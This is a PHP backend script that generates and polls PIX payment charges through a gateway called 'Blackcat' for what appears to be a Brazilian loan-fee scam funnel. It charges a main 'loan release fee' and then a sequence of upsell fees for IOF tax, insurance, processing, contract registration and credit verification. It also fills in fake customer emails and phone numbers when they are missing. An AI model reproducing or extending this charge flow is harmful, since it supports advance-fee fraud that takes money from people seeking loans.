<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-API-Key');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once __DIR__ . '/../../config/blackcat.php';

$action = $_GET['action'] ?? 'generate';

$products = [
    'main' => ['name' => 'Taxa de Liberação do Empréstimo', 'cents' => 2990],
    'up1'  => ['name' => 'Pagamento do Imposto IOF', 'cents' => 3090],
    'up2'  => ['name' => 'Seguro Garantia do Empréstimo', 'cents' => 2690],
    'up3'  => ['name' => 'Taxa de Processamento de Crédito', 'cents' => 1987],
    'up4'  => ['name' => 'Registro de Contrato Bancário', 'cents' => 3343],
    'kyc'  => ['name' => 'Taxa de Verificação de Crédito', 'cents' => 2990],
];

if ($action === 'product') {
    $step = $_GET['step'] ?? 'main';
    $prod = $products[$step] ?? $products['main'];
    echo json_encode([
        'success' => true,
        'product' => [
            'id' => $step,
            'name' => $prod['name'],
            'amount_cents' => $prod['cents']
        ],
        'next' => '/comprovante'
    ]);
    exit;
}

$rawInput = file_get_contents('php://input');
$input = json_decode($rawInput, true) ?: $_POST;

if ($action === 'generate') {
    $step = $input['step'] ?? $_GET['step'] ?? 'main';
    $prod = $products[$step] ?? $products['main'];

    $name = trim($input['name'] ?? $input['customer']['name'] ?? 'Cliente');
    $document = preg_replace('/\D/', '', $input['document'] ?? $input['cpf'] ?? $input['customer']['document']['number'] ?? '');
    $email = trim($input['email'] ?? $input['customer']['email'] ?? '');
    $phone = preg_replace('/\D/', '', $input['phone'] ?? $input['telefone'] ?? $input['customer']['phone'] ?? '');

    if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $email = 'cliente' . ($document ?: time()) . '@gmail.com';
    }
    if (strlen($phone) < 10) {
        $phone = '11999999999';
    }

    $amountCents = intval($input['amount_cents'] ?? $prod['cents']);

    $payload = [
        'amount' => $amountCents,
        'currency' => 'BRL',
        'paymentMethod' => 'pix',
        'items' => [
            [
                'title' => 'A&G ASSESSORIA FINANCEIRA LTDA - ' . $prod['name'],
                'quantity' => 1,
                'unitPrice' => $amountCents,
                'tangible' => false
            ]
        ],
        'customer' => [
            'name' => $name,
            'email' => $email,
            'phone' => $phone,
            'document' => [
                'number' => $document,
                'type' => 'cpf'
            ]
        ],
        'pix' => [
            'expiresInDays' => 1
        ],
        'externalRef' => 'ORDER-' . $step . '-' . time()
    ];

    $ch = curl_init(BLACKCAT_BASE_URL . '/sales/create-sale');
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json',
            'X-API-Key: ' . BLACKCAT_API_KEY
        ],
        CURLOPT_POSTFIELDS => json_encode($payload),
        CURLOPT_TIMEOUT => 30
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
        http_response_code(500);
        echo json_encode(['success' => false, 'error' => 'Erro de conexão com o gateway: ' . $error]);
        exit;
    }

    $resData = json_decode($response, true);

    if ($httpCode >= 200 && $httpCode < 300 && !empty($resData['success']) && !empty($resData['data'])) {
        $data = $resData['data'];
        $paymentData = $data['paymentData'] ?? [];
        $qrCode = $paymentData['copyPaste'] ?? $paymentData['qrCode'] ?? '';
        $qrImageBase64 = $paymentData['qrCodeBase64'] ?? '';
        $transactionId = $data['transactionId'] ?? '';

        echo json_encode([
            'success' => true,
            'pix' => [
                'transaction_id' => $transactionId,
                'payment_code' => $transactionId,
                'qr_code' => $qrCode,
                'qr_code_base64' => $qrImageBase64,
                'qr_code_url' => $qrImageBase64,
                'invoice_url' => $data['invoiceUrl'] ?? ''
            ]
        ]);
        exit;
    }

    $msg = $resData['message'] ?? $resData['error'] ?? 'Não foi possível gerar a cobrança PIX na Blackcat.';
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => $msg, 'details' => $resData]);
    exit;
}

if ($action === 'status') {
    $transactionId = trim($input['transaction_id'] ?? $_GET['transaction_id'] ?? '');

    if (empty($transactionId)) {
        echo json_encode(['success' => false, 'status' => 'pending', 'error' => 'transaction_id ausente.']);
        exit;
    }

    $ch = curl_init(BLACKCAT_BASE_URL . '/sales/' . urlencode($transactionId) . '/status');
    curl_setopt_array($ch, [
        CURLOPT_HTTPGET => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => [
            'X-API-Key: ' . BLACKCAT_API_KEY
        ],
        CURLOPT_TIMEOUT => 15
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $resData = json_decode($response, true);

    if ($httpCode === 200 && !empty($resData['success']) && !empty($resData['data'])) {
        $statusStr = strtoupper($resData['data']['status'] ?? 'PENDING');
        if ($statusStr === 'PAID') {
            echo json_encode(['success' => true, 'status' => 'paid']);
            exit;
        } elseif ($statusStr === 'CANCELLED' || $statusStr === 'REFUNDED') {
            echo json_encode(['success' => true, 'status' => 'cancelled']);
            exit;
        }
    }

    echo json_encode(['success' => true, 'status' => 'pending']);
    exit;
}

echo json_encode(['success' => false, 'error' => 'Ação inválida.']);
